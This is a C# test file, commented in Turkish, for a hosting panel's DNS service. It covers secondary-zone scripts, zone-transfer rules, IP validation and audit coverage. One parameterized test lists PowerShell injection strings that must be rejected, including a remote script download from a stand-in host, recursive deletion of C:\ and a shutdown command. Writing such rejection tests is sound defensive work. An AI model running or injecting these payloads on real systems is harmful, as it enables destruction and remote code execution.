using System.Reflection;
using AdaPanel.Core.Common;
using AdaPanel.Infrastructure.Dns;
using Xunit;

namespace AdaPanel.Infrastructure.Tests;

/// <summary>
/// İKİNCİL (slave/secondary) DNS desteği: bölge kipi, master listesi ve üretilen Windows DNS
/// komutları.
/// </summary>
/// <remarks>
/// <para>
/// <b>Neden komut metni birebir korunuyor:</b> bu script canlı sunucuda DNS bölgesini yeniden
/// yapılandırıyor. Yanlış cmdlet ya da eksik parametre "hata" olarak görünmez — bölge sessizce
/// eski kipinde kalır. Panel "ikincile geçirdim" der, alan adı ise master'daki güncel veriyi HİÇ
/// almaz. Bu, ancak birincil sunucu düştüğünde fark edilen bir arızadır; yani tam da yedek DNS'in
/// var olma sebebinin çalışmadığı anda.
/// </para>
/// <para>
/// <b>Neden IP doğrulaması ayrı ve sert:</b> master IP'leri KULLANICIDAN gelir ve doğrudan
/// PowerShell metnine gömülür. Panel LocalSystem olarak koşar; buradan kaçan bir dizge, sunucuda
/// SYSTEM yetkisiyle komut çalıştırmak demektir.
/// </para>
/// </remarks>
public sealed class DnsSecondaryZoneTests
{
    private const string Zone = "ornek.test";

    // --- İkincil bölge scripti: üç durumun ÜÇÜ de ele alınmalı ---

    [Fact]
    public void SecondaryScript_AddsTheZoneWhenItDoesNotExist()
    {
        var script = DnsService.BuildSecondaryZoneScript(Zone, ["192.0.2.53"]);

        Assert.Contains("if (-not $mevcut) {", script, StringComparison.Ordinal);
        Assert.Contains("Add-DnsServerSecondaryZone -Name $zoneName", script, StringComparison.Ordinal);
        Assert.Contains("-MasterServers $masters", script, StringComparison.Ordinal);
    }

    // Bolge halihazirda BIRINCIL ise donusturulmeli: Add-DnsServerSecondaryZone "zaten var" der ve
    // bolge birincil kalir -- panel ise gecis yaptigini sanardi.
    [Fact]
    public void SecondaryScript_ConvertsAnExistingPrimaryZone()
    {
        var script = DnsService.BuildSecondaryZoneScript(Zone, ["192.0.2.53"]);

        Assert.Contains("$mevcut.ZoneType -ne 'Secondary'", script, StringComparison.Ordinal);
        Assert.Contains("ConvertTo-DnsServerSecondaryZone -Name $zoneName", script, StringComparison.Ordinal);
    }

    // Zaten ikincilse yalnizca master listesi guncellenir; ConvertTo bu durumda hata verir.
    [Fact]
    public void SecondaryScript_OnlyUpdatesMastersWhenTheZoneIsAlreadySecondary()
    {
        var script = DnsService.BuildSecondaryZoneScript(Zone, ["192.0.2.53"]);

        Assert.Contains("Set-DnsServerSecondaryZone -Name $zoneName -MasterServers $masters", script, StringComparison.Ordinal);
    }

    /// <summary>
    /// İkincil bölgeye KAYIT YAZILMAZ. Bölge salt okunurdur; yazma denemesi hem başarısız olur hem
    /// de panelin "yayınlanan gruplar" defterini bozarak sonraki birincil senkronda master'dan
    /// gelen kayıtları öksüz sayıp silmeye çalışmasına yol açardı.
    /// </summary>
    [Fact]
    public void SecondaryScript_NeverTouchesResourceRecords()
    {
        var script = DnsService.BuildSecondaryZoneScript(Zone, ["192.0.2.53"]);

        Assert.DoesNotContain("Add-DnsServerResourceRecord", script, StringComparison.Ordinal);
        Assert.DoesNotContain("Remove-DnsServerResourceRecord", script, StringComparison.Ordinal);
        Assert.DoesNotContain("Set-DnsServerPrimaryZone", script, StringComparison.Ordinal);
    }

    /// <summary>
    /// Kip değişikliğinden sonra TAM transfer tetiklenmeli: aksi hâlde bölge SOA yenileme aralığı
    /// dolana kadar boş kalır ve alan adı saatlerce çözülmez.
    /// </summary>
    [Fact]
    public void SecondaryScript_StartsAFullTransferImmediately()
    {
        var script = DnsService.BuildSecondaryZoneScript(Zone, ["192.0.2.53"]);

        Assert.Contains("Start-DnsServerZoneTransfer -Name $zoneName -FullTransfer", script, StringComparison.Ordinal);
    }

    [Fact]
    public void SecondaryScript_QuotesEveryMasterSeparately()
    {
        var script = DnsService.BuildSecondaryZoneScript(Zone, ["192.0.2.53", "198.51.100.7"]);

        Assert.Contains("$masters = @('192.0.2.53','198.51.100.7')", script, StringComparison.Ordinal);
    }

    // --- Birincile DONUS ---

    /// <summary>
    /// Kullanıcı ikincilden birincile dönünce Windows'taki bölge HÂLÂ "Secondary" olur ve o bölgeye
    /// kayıt yazılamaz. Dönüştürme senkron scriptinin içinde olmazsa, her kayıt yazma denemesi
    /// hata verir ve panel sebebini söyleyemez.
    /// </summary>
    [Fact]
    public void PrimarySync_ConvertsASecondaryZoneBackToPrimary()
    {
        var script = BuildPrimarySyncScript(Zone, []);

        Assert.Contains("$mevcut.ZoneType -eq 'Secondary'", script, StringComparison.Ordinal);
        Assert.Contains("ConvertTo-DnsServerPrimaryZone -Name $zoneName", script, StringComparison.Ordinal);
    }

    // Bolge hic yoksa yine BIRINCIL olarak olusturulmali (eski davranis korunur).
    [Fact]
    public void PrimarySync_StillCreatesAMissingZoneAsPrimary()
    {
        var script = BuildPrimarySyncScript(Zone, []);

        Assert.Contains("Add-DnsServerPrimaryZone -Name $zoneName", script, StringComparison.Ordinal);
    }

    // --- AXFR / NOTIFY listesi ---

    /// <summary>
    /// Liste boşken transfer TAMAMEN kapalı olmalı. Açık AXFR, bölgenin tüm kayıtlarını (alt alan
    /// adları, iç servisler dahil) isteyen herkese verir.
    /// </summary>
    [Fact]
    public void TransferAcl_EmptyList_DisablesZoneTransfer()
    {
        var line = DnsService.BuildTransferAclLine([]);

        Assert.Contains("-SecureSecondaries NoTransfer", line, StringComparison.Ordinal);
        Assert.DoesNotContain("-SecondaryServers", line, StringComparison.Ordinal);
    }

    /// <summary>
    /// İzin verilen IP varsa AXFR yalnız onlara açılır VE aynı liste NOTIFY hedefi olur. NOTIFY
    /// olmadan ikincil sunucu değişiklikten haberdar olmaz; bölgeyi ancak yenileme aralığı dolunca
    /// çeker, yani saatlerce eski veriyi yayınlar.
    /// </summary>
    [Fact]
    public void TransferAcl_ListedIps_AllowTransferAndReceiveNotify()
    {
        var line = DnsService.BuildTransferAclLine(["192.0.2.53", "198.51.100.7"]);

        Assert.Contains("-SecureSecondaries TransferToSecureServers", line, StringComparison.Ordinal);
        Assert.Contains("-SecondaryServers '192.0.2.53','198.51.100.7'", line, StringComparison.Ordinal);
        Assert.Contains("-Notify NotifyServers", line, StringComparison.Ordinal);
        Assert.Contains("-NotifyServers '192.0.2.53','198.51.100.7'", line, StringComparison.Ordinal);
    }

    /// <summary>
    /// Sunucu geneli ikincil DNS sunucuları bölgeye özel listeyle BİRLEŞİR, onu EZMEZ. Ezseydi ya
    /// yedek DNS bölgeyi çekemez ya da bölgeye özel izin sessizce kaybolurdu.
    /// </summary>
    [Fact]
    public void NotifyTargets_MergeZoneAndServerWideLists()
    {
        var merged = DnsService.MergeNotifyTargets(["192.0.2.53"], ["198.51.100.7", "203.0.113.9"]);

        Assert.Equal(["192.0.2.53", "198.51.100.7", "203.0.113.9"], merged);
    }

    [Fact]
    public void NotifyTargets_DoNotRepeatAnIpThatIsInBothLists()
    {
        var merged = DnsService.MergeNotifyTargets(["192.0.2.53", "198.51.100.7"], ["198.51.100.7"]);

        Assert.Equal(["192.0.2.53", "198.51.100.7"], merged);
    }

    [Fact]
    public void NotifyTargets_TolerateNullLists()
    {
        Assert.Empty(DnsService.MergeNotifyTargets(null, null));
        Assert.Equal(["192.0.2.53"], DnsService.MergeNotifyTargets(null, ["192.0.2.53"]));
    }

    // --- IP dogrulama: KOMUT ENJEKSIYONU ---

    /// <summary>
    /// PowerShell'e giden metin kullanıcının yazdığı dizge DEĞİL, <c>IPAddress</c>'in ürettiği
    /// kanonik metin olmalı. Böylece tırnak kaçırma tek savunma hattı olmaktan çıkar.
    /// </summary>
    [Fact]
    public void IpList_ReturnsTheCanonicalFormNotTheUserText()
    {
        var sonuc = DnsService.NormalizeIpList(["2001:0DB8:0000:0000:0000:0000:0000:0001"], "dns.invalid_master_ip");

        Assert.Equal(["2001:db8::1"], sonuc);
    }

    /// <summary>
    /// Kaçırılmış tırnakla kapatılan bir alandan çıkmaya çalışan her giriş, script'e ULAŞMADAN
    /// reddedilmeli. Panel LocalSystem koşar: buradan kaçan bir dizge SYSTEM yetkisiyle komut
    /// çalıştırmaktır.
    /// </summary>
    [Theory]
    [InlineData("192.0.2.53'; Remove-DnsServerZone -Name 'ornek.test")]
    [InlineData("192.0.2.53' -and (Stop-Service DNS) -and '")]
    [InlineData("$(Invoke-WebRequest http://kotu.test/x.ps1)")]
    [InlineData("192.0.2.53`nRemove-Item C:\\ -Recurse")]
    [InlineData("; shutdown /r")]
    [InlineData("kotu.test")]
    [InlineData("999.999.999.999")]
    public void IpList_RejectsAnythingThatIsNotAPlainIpAddress(string deger)
    {
        var hata = Assert.Throws<AppException>(() => DnsService.NormalizeIpList([deger], "dns.invalid_master_ip"));

        Assert.Equal("dns.invalid_master_ip", hata.MessageKey);
    }

    /// <summary>
    /// Kapsam kimlikli IPv6 (<c>fe80::1%12</c>) reddedilir: <c>IPAddress</c> onu ayrıştırır ve
    /// kanonik metinde yüzde işareti ile arayüz adı KALIR — yani doğrulamayı geçen ama IP olmayan
    /// karakterler taşır. Üstelik bir master DNS adresi olarak da anlamsızdır.
    /// </summary>
    [Fact]
    public void IpList_RejectsScopedIpv6Addresses()
    {
        Assert.Throws<AppException>(() => DnsService.NormalizeIpList(["fe80::1%12"], "dns.invalid_master_ip"));
    }

    [Fact]
    public void IpList_SkipsBlankLinesAndDeduplicates()
    {
        var sonuc = DnsService.NormalizeIpList(["192.0.2.53", "  ", "", "192.0.2.53", " 198.51.100.7 "], "dns.invalid_master_ip");

        Assert.Equal(["192.0.2.53", "198.51.100.7"], sonuc);
    }

    [Fact]
    public void IpList_ReportsTheCallersErrorCode()
    {
        var hata = Assert.Throws<AppException>(() => DnsService.NormalizeIpList(["kotu"], "dns.invalid_secondary_ip"));

        Assert.Equal("dns.invalid_secondary_ip", hata.MessageKey);
    }

    [Fact]
    public void IpList_TreatsNullAsEmpty()
    {
        Assert.Empty(DnsService.NormalizeIpList(null, "dns.invalid_master_ip"));
    }

    // --- Denetim kaydi kapsami (kaynak taramasi) ---

    /// <summary>
    /// DNS uçları durum değiştirdiğinde İZ BIRAKMALI.
    /// </summary>
    /// <remarks>
    /// DnsController'da <c>IAuditService</c> bağımlılığı bile YOKTU. DNS, panelin en yıkıcı
    /// yüzeylerinden biri: tek bir A ya da MX değişikliği alan adının trafiğini veya postasını
    /// başka bir sunucuya taşır. Bunu kimin yaptığı kaydedilmezse, bir olaydan sonra elde hiçbir
    /// şey kalmaz. Test kaynağı tarar çünkü korunan şey tek bir davranış değil, "yeni uç eklerken
    /// denetim kaydını unutmak" hata sınıfıdır.
    /// </remarks>
    [Fact]
    public void Dns_uclarinin_HEPSI_denetim_kaydi_yazar()
    {
        var eksik = new List<string>();
        var incelenen = 0;

        foreach (var dosyaAdi in new[] { "DnsController.cs", "DnsTemplateController.cs" })
        {
            var metin = File.ReadAllText(Path.Combine(KaynakKoku(), "src", "AdaPanel.Api", "Controllers", dosyaAdi));

            Assert.True(
                metin.Contains("IAuditService", StringComparison.Ordinal),
                $"{dosyaAdi}: IAuditService bagimliligi YOK — bu denetleyici hic iz birakmiyor.");

            foreach (var (imza, govde) in UcGovdeleri(metin))
            {
                incelenen++;
                if (!govde.Contains("AuditAsync(", StringComparison.Ordinal))
                {
                    eksik.Add($"{dosyaAdi} → {imza}");
                }
            }
        }

        // ÖLÇEMEDİK ile SORUN YOK ayrımı: ayrıştırma bozulup hiçbir uç bulunamazsa test sessizce
        // geçer ve bir daha hiçbir şeyi korumazdı.
        Assert.True(incelenen >= 8, $"Uc taramasi bozulmus olabilir: yalnizca {incelenen} durum degistiren uc bulundu.");

        Assert.True(
            eksik.Count == 0,
            "Denetim kaydi YAZMAYAN DNS uclari var:\n  " + string.Join("\n  ", eksik));
    }

    /// <summary>Bölge kipini değiştiren uç YÖNETİCİYE kilitli olmalı.</summary>
    /// <remarks>
    /// İkincil kip bölgenin yetkili kaynağını dışarıdaki bir IP'ye devreder; o IP'yi belirleyen,
    /// alan adının bütün kayıtlarını belirler. Bir kiracının bunu kendi başına yapabilmesi, panelin
    /// barındırdığı bir alan adını sessizce dışarıdan yönetilebilir hâle getirmesi demektir.
    /// </remarks>
    [Theory]
    [InlineData("[HttpPost(\"mode\")]")]
    [InlineData("[HttpPost(\"transfer\")]")]
    public void Bolge_kipi_uclari_YONETICIYE_kilitli(string imza)
    {
        var metin = File.ReadAllText(Path.Combine(KaynakKoku(), "src", "AdaPanel.Api", "Controllers", "DnsController.cs"));
        var govde = UcGovdeleri(metin).Single(uc => uc.Imza == imza).Govde;

        Assert.Contains("[Authorize(Roles = \"Administrator\")]", govde, StringComparison.Ordinal);
        // Rol listesi ileride genisletilirse koruma kendiliginden yerinde olsun diye kapsam da denetlenir.
        Assert.Contains("CustomerAccess.EnsureSiteAsync", govde, StringComparison.Ordinal);
    }

    // --- Yardimcilar ---

    /// <summary>
    /// Birincil senkron scripti (özel, iç içe durum tipini aldığı için yansımayla çağrılır).
    /// </summary>
    private static string BuildPrimarySyncScript(string zoneName, IReadOnlyList<string> notifyTargets)
    {
        var durumTipi = typeof(DnsService).GetNestedType("DnsZoneState", BindingFlags.NonPublic);
        Assert.NotNull(durumTipi);

        var durum = Activator.CreateInstance(durumTipi!);
        durumTipi!.GetProperty("ZoneName")!.SetValue(durum, zoneName);

        var metot = typeof(DnsService).GetMethod("BuildSyncScript", BindingFlags.NonPublic | BindingFlags.Static);
        Assert.NotNull(metot);

        return (string)metot!.Invoke(null, [durum, notifyTargets])!;
    }

    /// <summary>Durum DEĞİŞTİREN uçları imza + gövde olarak ayırır (AuditCoverageTests ile aynı yaklaşım).</summary>
    private static IEnumerable<(string Imza, string Govde)> UcGovdeleri(string metin)
    {
        var http = new System.Text.RegularExpressions.Regex(@"\[Http(Get|Post|Put|Delete|Patch)[^\]]*\]");
        var eslesmeler = http.Matches(metin);

        for (var i = 0; i < eslesmeler.Count; i++)
        {
            var mevcut = eslesmeler[i];
            var son = i + 1 < eslesmeler.Count ? eslesmeler[i + 1].Index : metin.Length;
            var imza = mevcut.Value;

            if (!imza.StartsWith("[HttpPost", StringComparison.Ordinal)
                && !imza.StartsWith("[HttpPut", StringComparison.Ordinal)
                && !imza.StartsWith("[HttpDelete", StringComparison.Ordinal)
                && !imza.StartsWith("[HttpPatch", StringComparison.Ordinal))
            {
                continue;
            }

            yield return (imza, metin[mevcut.Index..son]);
        }
    }

    /// <summary>Depo kökünü test çıktısı klasöründen yukarı çıkarak bulur.</summary>
    private static string KaynakKoku()
    {
        var dizin = new DirectoryInfo(AppContext.BaseDirectory);
        while (dizin is not null && !File.Exists(Path.Combine(dizin.FullName, "AdaPanel.sln")))
        {
            dizin = dizin.Parent;
        }

        Assert.NotNull(dizin);
        return dizin!.FullName;
    }
}
